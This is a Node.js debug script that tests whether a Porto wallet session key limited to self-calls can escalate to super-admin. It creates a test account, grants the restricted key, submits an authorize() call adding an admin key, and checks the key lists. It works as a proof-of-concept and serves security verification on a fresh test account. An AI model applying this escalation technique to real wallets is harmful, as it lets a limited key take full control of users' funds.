#!/usr/bin/env node

/**
 * Research/debug script (not product code).
 *
 * Purpose:
 * - reproduce and verify self-call escalation risk hypotheses
 * - validate security assumptions for configure permission envelopes
 *
 * Safety:
 * - this script is for manual investigation only
 * - not used by the CLI runtime
 * - not used by CI tests
 */

import { Chains, Mode, Porto } from 'porto'
import * as Key from 'porto/viem/Key'
import * as WalletActions from 'porto/viem/WalletActions'
import * as WalletClient from 'porto/viem/WalletClient'
import {
  createPublicClient,
  encodeAbiParameters,
  encodeFunctionData,
  http,
  keccak256,
  parseAbi,
  toHex,
} from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'

const DEFAULT_RPC_URL = process.env.AGENT_WALLET_RELAY_URL ?? 'https://rpc.porto.sh'
const DEFAULT_CHAIN_ID = 84532
const DEFAULT_TTL_SECONDS = 7 * 24 * 60 * 60
const DEFAULT_FAUCET_CONFIRMATIONS = 1
const BASE_SEPOLIA_EXP_TOKEN = '0xfca413a634c4df6b98ebb970a44d9a32f8f5c64e'
const BASE_SEPOLIA_FAUCET_VALUE = '0x340aad21b3b700000'

const accountAbi = parseAbi([
  'function authorize((uint40 expiry,uint8 keyType,bool isSuperAdmin,bytes publicKey) key) returns (bytes32 keyHash)',
  'function getKeys() view returns ((uint40 expiry,uint8 keyType,bool isSuperAdmin,bytes publicKey)[] keys, bytes32[] keyHashes)',
])

function ensureHeadlessBrowserGlobals() {
  let nav = globalThis.navigator
  if (typeof nav === 'undefined') {
    nav = {
      maxTouchPoints: 0,
      userAgent: 'node',
      userAgentData: { mobile: false },
    }
    Object.defineProperty(globalThis, 'navigator', {
      configurable: true,
      value: nav,
      writable: true,
    })
  }

  if (typeof globalThis.window === 'undefined') {
    globalThis.window = {
      location: {
        hostname: 'localhost',
        origin: 'http://localhost',
      },
      navigator: nav,
    }
  }
}

function parseArgs(argv) {
  const options = {
    chainId: DEFAULT_CHAIN_ID,
    debug: false,
    rpcUrl: DEFAULT_RPC_URL,
    skipFaucet: false,
    ttlSeconds: DEFAULT_TTL_SECONDS,
  }

  for (let i = 2; i < argv.length; i += 1) {
    const token = argv[i]
    if (!token) continue

    if (token === '--debug') {
      options.debug = true
      continue
    }

    if (token === '--skip-faucet') {
      options.skipFaucet = true
      continue
    }

    if (token === '--rpc-url') {
      options.rpcUrl = argv[i + 1] ?? options.rpcUrl
      i += 1
      continue
    }

    if (token === '--chain-id') {
      const parsed = Number(argv[i + 1] ?? '')
      i += 1
      if (Number.isInteger(parsed) && parsed > 0) options.chainId = parsed
      continue
    }

    if (token === '--ttl-seconds') {
      const parsed = Number(argv[i + 1] ?? '')
      i += 1
      if (Number.isInteger(parsed) && parsed > 0) options.ttlSeconds = parsed
      continue
    }
  }

  return options
}

function usage() {
  console.log(
    'Usage: node scripts/debug-selfcall-escalation.mjs [--chain-id 84532] [--rpc-url <url>] [--ttl-seconds 604800] [--skip-faucet] [--debug]',
  )
  console.log('')
  console.log('What this does:')
  console.log('  1) Creates a fresh mock account in relay mode.')
  console.log('  2) Grants a normal key with calls: [{ to: <account> }] only.')
  console.log(
    '  3) Uses that normal key to submit a self-call authorize(...) that adds a super-admin secp256k1 key.',
  )
  console.log(
    '  4) Checks wallet_getKeys and onchain getKeys() to confirm whether admin escalation occurred.',
  )
}

function resolveChain(chainId) {
  if (chainId === Chains.base.id) return Chains.base
  if (chainId === Chains.baseSepolia.id) return Chains.baseSepolia
  throw new Error(`Unsupported chain id ${String(chainId)} (supported: 8453, 84532).`)
}

function shortHex(value) {
  if (typeof value !== 'string') return String(value)
  if (value.length <= 18) return value
  return `${value.slice(0, 10)}..${value.slice(-6)}`
}

function resolveChainRpcUrl(chain) {
  const rpcUrl = chain?.rpcUrls?.default?.http?.[0]
  if (!rpcUrl)
    throw new Error(`Missing public RPC URL for chain ${String(chain?.id ?? 'unknown')}.`)
  return rpcUrl
}

async function sleep(ms) {
  await new Promise((resolve) => setTimeout(resolve, ms))
}

async function rpc(rpcUrl, method, params) {
  const response = await fetch(rpcUrl, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      id: Date.now(),
      jsonrpc: '2.0',
      method,
      params,
    }),
  })
  if (!response.ok) {
    const body = await response.text().catch(() => '')
    throw new Error(`${method} HTTP ${response.status}: ${body}`)
  }
  const payload = await response.json()
  if (payload.error) {
    throw new Error(`${method} RPC ${payload.error.code}: ${payload.error.message}`)
  }
  return payload.result
}

async function waitForTransactionConfirmations({
  chain,
  confirmations,
  timeoutMs,
  transactionHash,
}) {
  const startedAt = Date.now()
  const required = BigInt(confirmations)
  const publicClient = createPublicClient({
    chain,
    transport: http(resolveChainRpcUrl(chain)),
  })

  while (Date.now() - startedAt <= timeoutMs) {
    const receipt = await publicClient
      .getTransactionReceipt({ hash: transactionHash })
      .catch(() => null)
    if (receipt?.blockNumber) {
      const latestBlock = await publicClient.getBlockNumber()
      const count = latestBlock - receipt.blockNumber + 1n
      if (count >= required) {
        return {
          confirmations: Number(count),
          includedInBlock: receipt.blockNumber,
          latestBlock,
        }
      }
    }
    await sleep(1_000)
  }

  throw new Error(
    `Timed out waiting for tx ${transactionHash} to reach ${confirmations} confirmations within ${timeoutMs}ms.`,
  )
}

async function ensureFaucetFundsIfAvailable({ account, chain, rpcUrl }) {
  if (chain.id !== Chains.baseSepolia.id) return { skipped: true }
  const faucet = await rpc(rpcUrl, 'wallet_addFaucetFunds', [
    {
      address: account,
      chainId: chain.id,
      tokenAddress: BASE_SEPOLIA_EXP_TOKEN,
      value: BASE_SEPOLIA_FAUCET_VALUE,
    },
  ])
  const faucetTxHash = typeof faucet?.transactionHash === 'string' ? faucet.transactionHash : null
  if (!faucetTxHash) {
    throw new Error(
      `wallet_addFaucetFunds returned no transaction hash (message: ${String(faucet?.message ?? 'none')}).`,
    )
  }
  const confirmations = await waitForTransactionConfirmations({
    chain,
    confirmations: DEFAULT_FAUCET_CONFIRMATIONS,
    timeoutMs: 30_000,
    transactionHash: faucetTxHash,
  })
  return {
    ...confirmations,
    message: faucet?.message,
    skipped: false,
    transactionHash: faucetTxHash,
  }
}

async function waitForBundleTerminal({ bundleId, rpcUrl, timeoutMs }) {
  const startedAt = Date.now()
  while (Date.now() - startedAt <= timeoutMs) {
    const status = await rpc(rpcUrl, 'wallet_getCallsStatus', [bundleId]).catch((error) => {
      return { error: error instanceof Error ? error.message : String(error) }
    })

    if (
      status &&
      typeof status === 'object' &&
      Number.isInteger(status.status) &&
      status.status >= 200
    ) {
      if (status.status === 200 || status.status === 201) return status
      throw new Error(`Bundle ${bundleId} failed with terminal status ${status.status}.`)
    }
    if (status && typeof status === 'object' && typeof status.error === 'string') {
      throw new Error(`wallet_getCallsStatus failed for ${bundleId}: ${status.error}`)
    }
    await sleep(1_000)
  }
  throw new Error(
    `Timed out waiting for bundle ${bundleId} to reach successful terminal status within ${timeoutMs}ms.`,
  )
}

async function getWalletKeys({ account, chainId, rpcUrl }) {
  const keysByChain = await rpc(rpcUrl, 'wallet_getKeys', [
    { address: account, chainIds: [chainId] },
  ])
  const chainHex = `0x${chainId.toString(16)}`
  const keys = Array.isArray(keysByChain?.[chainHex]) ? keysByChain[chainHex] : []
  return keys
}

async function getOnchainKeyHashes({ account, chain }) {
  const publicClient = createPublicClient({
    chain,
    transport: http(resolveChainRpcUrl(chain)),
  })

  const [, keyHashes] = await publicClient.readContract({
    abi: accountAbi,
    address: account,
    functionName: 'getKeys',
  })
  return keyHashes
}

function computeExpectedKeyHash({ keyType, publicKeyBytes }) {
  return keccak256(
    encodeAbiParameters(
      [{ type: 'uint8' }, { type: 'bytes32' }],
      [keyType, keccak256(publicKeyBytes)],
    ),
  )
}

function summarizeWalletKeys(title, keys) {
  console.log(title)
  if (!Array.isArray(keys) || keys.length === 0) {
    console.log('  - none')
    return
  }
  for (const key of keys) {
    console.log(
      `  - role=${key?.role ?? 'unknown'} type=${key?.type ?? 'unknown'} hash=${shortHex(String(key?.hash ?? 'unknown'))} pub=${shortHex(String(key?.publicKey ?? 'unknown'))}`,
    )
  }
}

async function sendPreparedSigned({
  calls,
  chain,
  client,
  from,
  keyPrivateKey,
  keyPublicKey,
  rpcUrl,
  debug,
}) {
  const prepared = await WalletActions.prepareCalls(client, {
    chainId: chain.id,
    from,
    calls,
    key: {
      prehash: false,
      publicKey: keyPublicKey,
      type: 'secp256k1',
    },
  })
  if (debug) {
    console.log(`[debug] prepared digest=${prepared.digest}`)
    console.log(`[debug] prepared key=${JSON.stringify(prepared.key)}`)
  }

  const signature = await Key.sign(
    {
      privateKey: () => keyPrivateKey,
      publicKey: keyPublicKey,
      role: 'session',
      type: 'secp256k1',
    },
    {
      address: null,
      payload: prepared.digest,
      wrap: false,
    },
  )

  const sent = await WalletActions.sendPreparedCalls(client, {
    capabilities: prepared.capabilities,
    chainId: toHex(chain.id),
    context: prepared.context,
    key: prepared.key,
    signature,
  })

  const bundleId = Array.isArray(sent) ? sent[0]?.id : sent?.id
  if (!bundleId) throw new Error('sendPreparedCalls returned no bundle id.')

  const terminal = await waitForBundleTerminal({
    bundleId,
    rpcUrl,
    timeoutMs: 60_000,
  })
  return {
    bundleId,
    status: terminal.status,
  }
}

async function main() {
  ensureHeadlessBrowserGlobals()
  if (process.argv.includes('--help') || process.argv.includes('-h')) {
    usage()
    return
  }

  const options = parseArgs(process.argv)
  const chain = resolveChain(options.chainId)

  const sessionPrivateKey = generatePrivateKey()
  const sessionAccount = privateKeyToAccount(sessionPrivateKey)
  const candidateAdminPrivateKey = generatePrivateKey()
  const candidateAdminAccount = privateKeyToAccount(candidateAdminPrivateKey)
  const candidateAdminPublicKey = encodeAbiParameters(
    [{ type: 'address' }],
    [candidateAdminAccount.address],
  )
  const expectedAdminHash = computeExpectedKeyHash({
    keyType: 2,
    publicKeyBytes: candidateAdminPublicKey,
  })

  const mode = Mode.relay({ mock: true })
  const porto = Porto.create({
    announceProvider: false,
    chains: [Chains.base, Chains.baseSepolia],
    mode,
    relay: http(options.rpcUrl),
  })

  const client = WalletClient.fromPorto(porto, { chain })

  try {
    console.log(`[1/7] creating mock account on chain ${chain.id}...`)
    const connected = await WalletActions.connect(client, {
      chainIds: [chain.id],
      createAccount: true,
    })
    const account = connected.accounts?.[0]?.address
    if (!account) throw new Error('Failed to create mock account.')
    console.log(`      account: ${account}`)
    console.log(`      normal-key candidate: ${sessionAccount.address}`)
    console.log(`      super-admin candidate: ${candidateAdminAccount.address}`)
    console.log(`      expected super-admin keyHash: ${expectedAdminHash}`)

    console.log('[2/7] baseline keys (wallet_getKeys)...')
    const beforeKeys = await getWalletKeys({
      account,
      chainId: chain.id,
      rpcUrl: options.rpcUrl,
    })
    summarizeWalletKeys('      before:', beforeKeys)

    console.log('[3/7] granting normal key with calls:[{to:account}] only...')
    const expiry = Math.floor(Date.now() / 1000) + options.ttlSeconds
    const feeTokenSymbol = chain.id === Chains.baseSepolia.id ? 'EXP' : 'native'
    const grant = await WalletActions.grantPermissions(client, {
      address: account,
      chainId: chain.id,
      expiry,
      feeToken: {
        limit: '1000000000000000000',
        symbol: feeTokenSymbol,
      },
      key: {
        publicKey: sessionAccount.address,
        type: 'secp256k1',
      },
      permissions: {
        calls: [{ to: account }],
      },
    })
    console.log(`      permission id: ${grant.id ?? 'none'}`)

    if (!options.skipFaucet) {
      console.log('[4/7] funding account (faucet when available)...')
      const faucet = await ensureFaucetFundsIfAvailable({
        account,
        chain,
        rpcUrl: options.rpcUrl,
      })
      if (faucet.skipped) {
        console.log('      skipped (not base sepolia)')
      } else {
        console.log(
          `      faucet tx=${faucet.transactionHash} confirmations=${faucet.confirmations} includedBlock=${String(faucet.includedInBlock)}`,
        )
      }
    } else {
      console.log('[4/7] skipping faucet by flag.')
    }

    console.log('[5/7] attempting escalation call signed by granted normal key...')
    const authorizeEscalationData = encodeFunctionData({
      abi: accountAbi,
      functionName: 'authorize',
      args: [
        {
          expiry: 0,
          isSuperAdmin: true,
          keyType: 2,
          publicKey: candidateAdminPublicKey,
        },
      ],
    })
    console.log(
      `      call: account.authorize(superAdmin=TRUE, key=${candidateAdminAccount.address})`,
    )
    const sent = await sendPreparedSigned({
      calls: [{ to: account, value: 0n, data: authorizeEscalationData }],
      chain,
      client,
      debug: options.debug,
      from: account,
      keyPrivateKey: sessionPrivateKey,
      keyPublicKey: sessionAccount.address,
      rpcUrl: options.rpcUrl,
    })
    console.log(`      bundle id: ${sent.bundleId}`)
    console.log(`      bundle status: ${sent.status}`)

    console.log('[6/7] post-call keys (wallet_getKeys)...')
    const afterKeys = await getWalletKeys({
      account,
      chainId: chain.id,
      rpcUrl: options.rpcUrl,
    })
    summarizeWalletKeys('      after:', afterKeys)

    console.log('[7/7] post-call onchain key hashes (getKeys)...')
    const onchainKeyHashes = await getOnchainKeyHashes({ account, chain }).catch((error) => {
      const message = error instanceof Error ? error.message : String(error)
      console.log(`      unable to read onchain getKeys(): ${message}`)
      return []
    })
    if (onchainKeyHashes.length === 0) {
      console.log('      - none / unavailable')
    } else {
      for (const hash of onchainKeyHashes) {
        console.log(`      - ${hash}`)
      }
    }

    const walletFoundEscalated = afterKeys.some(
      (key) =>
        String(key?.hash ?? '').toLowerCase() === expectedAdminHash.toLowerCase() &&
        String(key?.role ?? '').toLowerCase() === 'admin',
    )
    const onchainFoundEscalated = onchainKeyHashes.some(
      (hash) => String(hash).toLowerCase() === expectedAdminHash.toLowerCase(),
    )

    console.log('')
    if (walletFoundEscalated || onchainFoundEscalated) {
      console.log('RESULT: ESCALATION CONFIRMED')
      console.log(
        'The normal key granted with self-call wildcard was able to authorize a super-admin key.',
      )
      process.exitCode = 2
      return
    }

    console.log('RESULT: NO ESCALATION OBSERVED')
    console.log('This run did not produce the expected super-admin key on relay or onchain views.')
  } finally {
    porto.destroy()
  }
}

main().catch((error) => {
  const asError = error instanceof Error ? error : new Error(String(error))
  console.error(`Error: ${asError.message}`)
  if (asError.stack) console.error(asError.stack)
  process.exitCode = 1
})
